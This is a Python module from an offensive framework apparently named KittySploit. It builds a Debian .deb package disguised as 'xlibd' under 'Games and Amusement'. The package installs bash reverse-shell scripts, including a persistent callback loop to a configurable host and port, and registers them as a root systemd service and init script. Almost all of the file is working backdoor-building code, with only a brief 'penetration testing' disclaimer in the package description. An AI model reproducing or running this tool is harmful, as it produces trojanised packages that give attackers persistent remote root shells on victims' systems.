from kittysploit import *
import os
import tarfile
from pathlib import Path

class Module(Backdoor):
    
    __info__ = {
        'name': 'Debian Package Creator',
        'description': 'Debian Package Creator',
        'author': 'KittySploit Team',
        'platform': Platform.LINUX,
    }

    lhost = OptString('127.0.0.1','Connect-back IP address', True)
    lport = OptPort(5555,'Connect-back TCP Port', True)

    package_name = OptString("xlibd", "Package name", True)
    version = OptString("1.6", "Package version", True)
    

    def create_ar_archive(self, output_filename, *files):
        """
        Create an ar archive from the given files.
        """
        def pad(name):
            return name + ' ' * (16 - len(name))

        def write_ar_file(archive, filename, data):
            archive.write(b'!<arch>\n')  # ar archive magic number
            for name, content in data.items():
                archive.write(pad(name).encode('utf-8'))
                archive.write(b'0           ')  # timestamp
                archive.write(b'0     ')  # owner id
                archive.write(b'0     ')  # group id
                archive.write(b'100644  ')  # file mode
                archive.write(f'{len(content):<10}'.encode('utf-8'))  # file size
                archive.write(b'`\n')  # file magic number
                archive.write(content)
                if len(content) % 2 != 0:
                    archive.write(b'\n')  # ar files are 2-byte aligned

        file_data = {}
        for file in files:
            with open(file, 'rb') as f:
                file_data[Path(file).name] = f.read()

        with open(output_filename, 'wb') as archive:
            write_ar_file(archive, output_filename, file_data)

    def create_control_tar(self, control_content, output_filename):
        """
        Create a control.tar.gz file with the given control content.
        """
        control_file_path = "control"
        with open(control_file_path, 'w') as f:
            f.write(control_content)

        with tarfile.open(output_filename, "w:gz") as tar:
            tar.add(control_file_path, arcname='control')

        os.remove(control_file_path)

    def create_data_tar(self, source_dir, output_filename):
        """
        Create a data.tar.gz file from the given directory.
        """
        with tarfile.open(output_filename, "w:gz") as tar:
            for root, _, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, source_dir)
                    tar.add(file_path, arcname=arcname)

    def _cleanup_temp_files(self, output_dir, package_dir, data_dir):
        """Clean up temporary files and directories used for building the .deb"""
        try:
            import shutil
            
            # Clean up build directory
            if package_dir.exists():
                shutil.rmtree(package_dir)
                print_success(f"Cleaned up build directory: {package_dir}")
            
            # Clean up data directory (payload files)
            if data_dir.exists():
                shutil.rmtree(data_dir)
                print_success(f"Cleaned up data directory: {data_dir}")
            
            # Clean up any temporary control files
            temp_control = Path("control")
            if temp_control.exists():
                temp_control.unlink()
                print_success(f"Cleaned up temporary control file")
            
            print_success(f"Cleanup completed - only .deb package remains in output directory")
            
        except Exception as e:
            print_warning(f"Cleanup failed: {e}")
            print_warning(f"You may need to manually clean up temporary files")

    def run(self):
        try:
            print_success(f"Creating Debian package: {self.package_name} v{self.version}")
            print_success(f"Backdoor target: {self.lhost}:{self.lport}")
            
            # Ensure output directory exists
            output_dir = Path("output")
            output_dir.mkdir(parents=True, exist_ok=True)
            
            # Create project directory structure
            project_name = f"{self.package_name}_{self.version}_all"
            data_dir = output_dir / project_name
            data_dir.mkdir(parents=True, exist_ok=True)
            
            # Create subdirectories
            (data_dir / "usr" / "bin").mkdir(parents=True, exist_ok=True)
            (data_dir / "usr" / "lib" / "systemd" / "system").mkdir(parents=True, exist_ok=True)
            (data_dir / "etc" / "init.d").mkdir(parents=True, exist_ok=True)
            (data_dir / "var" / "log").mkdir(parents=True, exist_ok=True)
            
            # Create payload files using inherited create_file method
            reverse_shell_payload = f"""#!/bin/bash
# Reverse shell payload for {self.lhost}:{self.lport}
bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
"""
            
            persistent_payload = f"""#!/bin/bash
# Persistent backdoor for {self.lhost}:{self.lport}
while true; do
    bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
    sleep 30
done
"""
            
            # Create payload scripts
            self.create_file(str(data_dir / "usr" / "bin" / f"{self.package_name}.sh"), reverse_shell_payload)
            self.create_file(str(data_dir / "usr" / "bin" / f"{self.package_name}_persistent.sh"), persistent_payload)
            
            # Create systemd service
            systemd_service = f"""[Unit]
Description=KittySploit Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/{self.package_name}.sh
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
"""
            
            self.create_file(str(data_dir / "usr" / "lib" / "systemd" / "system" / f"{self.package_name}.service"), systemd_service)
            
            # Create init script
            init_script = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          {self.package_name}
# Required-Start:    $local_fs $network
# Required-Stop:     $local_fs $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: KittySploit Backdoor Service
# Description:       KittySploit Backdoor Service
### END INIT INFO

case "$1" in
    start)
        echo "Starting {self.package_name}..."
        /usr/bin/{self.package_name}.sh &
        echo $! > /var/run/{self.package_name}.pid
        ;;
    stop)
        echo "Stopping {self.package_name}..."
        kill `cat /var/run/{self.package_name}.pid`
        rm /var/run/{self.package_name}.pid
        ;;
    restart)
        $0 stop
        $0 start
        ;;
    status)
        if [ -f /var/run/{self.package_name}.pid ]; then
            echo "{self.package_name} is running"
        else
            echo "{self.package_name} is not running"
        fi
        ;;
    *)
        echo "Usage: $0 {{start|stop|restart|status}}"
        exit 1
        ;;
esac
"""
            
            self.create_file(str(data_dir / "etc" / "init.d" / self.package_name), init_script)
            
            # Create README
            readme_content = f"""# {self.package_name} - KittySploit Package

This package contains a backdoor payload for penetration testing purposes.

## Installation
```bash
sudo dpkg -i {self.package_name}_{self.version}_all.deb
```

## Usage
The backdoor will connect to {self.lhost}:{self.lport} when executed.

## Files installed:
- /usr/bin/{self.package_name}.sh - Main backdoor script
- /usr/bin/{self.package_name}_persistent.sh - Persistent backdoor
- /etc/init.d/{self.package_name} - Init script
- /usr/lib/systemd/system/{self.package_name}.service - Systemd service

## Uninstallation
```bash
sudo dpkg -r {self.package_name}
```
"""
            
            self.create_file(str(data_dir / "README.md"), readme_content)
            
            # Create control file
            control = f"""Package: {self.package_name}
Version: {self.version}
Section: Games and Amusement
Priority: optional
Architecture: all
Maintainer: KittySploit Team <team@kittysploit.com>
Description: KittySploit Backdoor Package
 This package contains a backdoor payload for penetration testing.
 The backdoor will connect to {self.lhost}:{self.lport} when executed.
 Use responsibly and only on systems you own or have permission to test.
"""
            
            # Create package directory for building
            package_dir = output_dir / f"{self.package_name}_{self.version}_build"
            package_dir.mkdir(parents=True, exist_ok=True)
            
            # Create debian-binary file
            self.create_file(str(package_dir / "debian-binary"), "2.0\n")
            
            # Create control.tar.gz file
            control_tar_path = package_dir / "control.tar.gz"
            self.create_control_tar(control, control_tar_path)
            
            # Create data.tar.gz file
            data_tar_path = package_dir / "data.tar.gz"
            self.create_data_tar(str(data_dir), data_tar_path)
            
            # Create .deb package using pure Python
            deb_file_path = output_dir / f"{self.package_name}_{self.version}_all.deb"
            self.create_ar_archive(deb_file_path, package_dir / "debian-binary", control_tar_path, data_tar_path)
            
            print_success(f"Debian package created successfully!")
            print_success(f"Package: {deb_file_path.name}")
            print_success(f"Location: {deb_file_path.absolute()}")
            print_success(f"Payload: Reverse shell to {self.lhost}:{self.lport}")
            print_success(f"Output directory: {output_dir.absolute()}")
            
            # Clean up temporary files and directories
            self._cleanup_temp_files(output_dir, package_dir, data_dir)
                        
        except Exception as e:
            print_error(f"deb_packaging failed: {e}")
            import traceback
            traceback.print_exc()
            return False
